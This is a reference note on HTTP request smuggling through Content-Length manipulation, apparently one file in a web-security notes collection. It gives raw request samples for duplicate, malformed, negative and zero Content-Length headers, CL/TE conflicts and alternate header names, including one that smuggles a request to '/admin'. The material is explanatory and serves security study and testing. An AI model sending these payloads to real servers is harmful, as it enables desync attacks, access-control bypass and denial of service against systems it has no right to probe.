# CL manipulation — the Content-Length tricks

## The CL primitives — what the header controls

`Content-Length: N` — the body is N bytes after the headers end. Every
parser reads it the same way — except when it's malformed, duplicated,
or in conflict with `Transfer-Encoding`.

## The duplicate-CL — `CL: 4` / `CL: 7`

```text
POST / HTTP/1.1
Host: t
Content-Length: 4
Content-Length: 7

A=1&B=2
```

Two CL headers — RFC 7230 says reject — implementations differ:
- nginx, Apache: reject `400`
- some frameworks: take the first
- some take the last
- some join them as `4,7` → invalid

The disagreement is a CL.CL desync — front picks 4, back picks 7 →
the back reads 3 extra bytes into the next request.

## The whitespace-CL — `CL:  4` / `CL:4`

```text
Content-Length:  4     — extra spaces
Content-Length:4       — no space
Content-Length:\t4     — tab
```

Some parsers require exactly one space, others trim — a strict front
rejects, a lenient back honors → desync.

## The non-numeric CL — `CL: 4a`, `CL: 0x10`

```text
Content-Length: 4a      — trailing garbage
Content-Length: 0x10    — hex
Content-Length: +4      — signed
Content-Length: 4.0     — float
```

Parsers differ on strictness — `4a` rejects or reads `4`; `0x10` rejects
or reads `16`; `+4` rejects or reads `4` — each is a desync candidate.

## The negative CL — `CL: -1`

```text
Content-Length: -1
```

A parser treating CL as signed → -1 → reject; a parser treating it as
unsigned → huge → wait-forever; a parser clamping → 0. The disagreement
is a desync or a DoS.

## The CL=0 with body — the ignore-the-body

```text
POST / HTTP/1.1
Content-Length: 0

GET /admin HTTP/1.1
Host: t
```

`CL: 0` + body — the front reads 0 bytes → the body is the NEXT request —
CL.0 desync — `client-side-desync.md`.

## The CL-too-small — the truncated body

```text
POST / HTTP/1.1
Content-Length: 4

A=1&B=2&C=3
```

CL=4 → the front reads `A=1&` → the rest (`B=2&C=3`) is the next request —
a request-smuggle via under-counted CL.

## The CL-too-large — the hang

```text
POST / HTTP/1.1
Content-Length: 100

A=1
```

CL=100 but only 3 bytes sent → the front waits for 97 more → hang — a
detection oracle (the "does it hang" test) — `detection.md`.

## The CL-TE ordering — which header wins

```text
Content-Length: 4
Transfer-Encoding: chunked     — TE wins per RFC

vs

Transfer-Encoding: chunked
Content-Length: 4              — same RFC answer
```

RFC says TE wins ALWAYS — but implementations differ — some honor CL
first, some TE first, some reject — the disagreement is the CL.TE /
TE.CL desync.

## The TE-strips-CL — the proxy that removes CL

Some proxies STRIP `Content-Length` when `Transfer-Encoding` is present —
the back-end sees only TE → chunks — a front-end that doesn't strip
sends both — disagreement.

## The TE-adds-CL — the proxy that adds CL

The reverse — a proxy ADDS `Content-Length` after de-chunking → the
back-end sees both — which does it honor?

## The `Transfer-Encoding` case — `chunked` vs `Chunked`

```text
Transfer-Encoding: Chunked
Transfer-Encoding: CHUNKED
```

Case-insensitive per RFC — some parsers exact-match — `obfuscation.md`.

## The X-Content-Length / alternate headers — `X-CL`, `Content_Length`

```text
Content_Length: 4
X-Content-Length: 4
```

Non-standard headers some frameworks honor — a front-end that forwards
them → the back-end reads `Content_Length` instead of `Content-Length` —
a header-name smuggle.
